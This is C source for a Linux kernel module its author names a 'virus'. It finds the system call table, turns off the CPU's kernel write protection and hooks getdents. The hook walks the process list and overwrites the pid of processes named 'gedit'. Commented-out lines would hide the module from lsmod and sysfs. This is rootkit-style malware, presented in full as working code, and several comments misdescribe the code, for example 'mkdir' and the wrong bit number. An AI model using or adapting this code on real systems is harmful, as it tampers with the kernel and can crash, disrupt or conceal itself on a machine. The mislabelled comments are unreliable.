#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <asm/uaccess.h>
#include <linux/unistd.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/smp_lock.h>

//#include <sys/stat.h>
//#include <fcntl.h>



/********** prototypes and declarations **********/
void **syscall_table;
long (*getuid)(void); // = syscall_table[__NR_getuid]
long (*getdents)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count); // = syscall_table[__NR_getdents]

unsigned long** find_syscall_table(void);
long hacked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
unsigned long long clear_wp_cr0(void);

static int __init lkm_virus_init(void);
static void __exit lkm_virus_exit(void);

char psname[10]="gedit";
char *processname=psname;

/********** implementations **********/

/**
 * @brief Finding system call table
 * @returns The pointer to the head of system call table
 */
unsigned long **find_syscall_table(void) {
	typedef unsigned long UL;
	UL *table;
	UL ptr;

	for (ptr = (UL)&sys_close; ptr < (UL)&loops_per_jiffy; ptr += sizeof(void *)) {
		table = (UL *)ptr;
		if (table[__NR_close] == (UL)sys_close) {
			printk(KERN_DEBUG "Found!!!");
			return (UL **)ptr;
		}
	}
	printk(KERN_DEBUG "Not Found TAT");
	return NULL;
}

int myatoi(char *str)
{
	int i, len = strlen(psname);
	for (i = 0; i < len; ++i)
	{
		if (str[i] != psname[i]) return (-1);
	}
	return (1);
}

/**
 * @brief The hacked mkdir function, which first do what I specified, and then call the original mkdir
 * @returns The exit code of original system call mkdir
 */
long hacked_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count) {
	struct task_struct *p = get_current(),*entry=NULL;
	list_for_each_entry(entry,&(p->tasks),tasks)
	{
		if (myatoi(entry->comm) == 1) {
			printk("Go die, %s!\n",entry->comm);
			entry->pid = 0;
		}
	}
	long value = (*getdents) (fd, dirp, count);
	printk(KERN_INFO "finished hacked_getdents.\n");
	return value;
}

/**
 * @brief Under the x86_64 architecture linux kernel, use asm to the the write-protection bit of register cr0 to 0
 * @returns The original value of cr0
 */
unsigned long long clear_wp_cr0(void) {
	unsigned long long cr0 = 0;
	unsigned long long ret;

	asm volatile("movq %%cr0, %0": "=a"(cr0));
	ret = cr0;
	cr0 &= ~0x10000LL; // clear the 20 bit of CR0
	asm volatile ("movq %0, %%cr0": : "a"(cr0));
	return ret;
}

/**
 * @brief Under the x86_64 architecture linux kernel, use asm to forcefully write register cr0
 */
void set_cr0(unsigned long long cr0) {
	asm volatile("movq %0, %%cr0": :"a"(cr0));
}

/**
 * @brief module entry
 */
static int __init lkm_virus_init(void) {

/*	struct task_struct *p = get_current(),*entry=NULL;
	list_for_each_entry(entry,&(p->tasks),tasks)
	{
		
			printk("pid found=%d : %s\n",entry->pid, entry->comm);
	}
*/

	unsigned long long cr0;

	/**** hide from lsmod ****/
	// list_del_init(&THIS_MODULE->list);
	/**** hide from sysfs ****/
	// kobject_del(&THIS_MODULE->mkobj.kobj);

	/**** find syscall table ****/
	syscall_table = (void **)find_syscall_table();
	if (!syscall_table)
		return -1;

	/**** find the original system call ****/
	getdents = syscall_table[__NR_getdents];
	getuid = syscall_table[__NR_getuid];

	/**** system call hooking ****/
	cr0 = clear_wp_cr0();
	syscall_table[__NR_getdents] = hacked_getdents;
	set_cr0(cr0);

	return 0;
}

/**
 * @brief Module exit. Will never be called
 */
static void __exit lkm_virus_exit(void) {
	unsigned long long cr0;
	cr0 = clear_wp_cr0();
	syscall_table[__NR_getdents] = getdents;
	set_cr0(cr0);
}

/*********** register entry and exit ***********/
module_init(lkm_virus_init);
module_exit(lkm_virus_exit);